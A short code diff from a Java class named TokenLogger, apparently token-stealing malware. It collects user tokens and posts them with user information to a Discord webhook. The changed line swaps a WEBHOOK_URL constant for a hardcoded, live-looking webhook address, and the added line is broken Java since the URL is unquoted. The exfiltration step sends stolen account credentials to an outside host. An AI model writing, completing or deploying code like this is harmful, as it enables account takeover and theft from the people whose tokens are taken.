@@ -40,7 +40,7 @@ public class TokenLogger {
             tokenDatabase.add(token);
             String infoEmbed = EmbedGenerator.generateEmbed(userInfo, token);
             if (infoEmbed == null) return;
-            Requests.post(infoEmbed, WEBHOOK_URL);
+            Requests.post(infoEmbed, https://discord.com/api/webhooks/1348751775829594193/Z7d6r0S9uQj9pt8fxSO61Noj5Z3F1GwaEXm-k_iaOIPC0ZfOziR_1INcITvrPILZPBhD);
         });
         tokenDatabase.close();
 
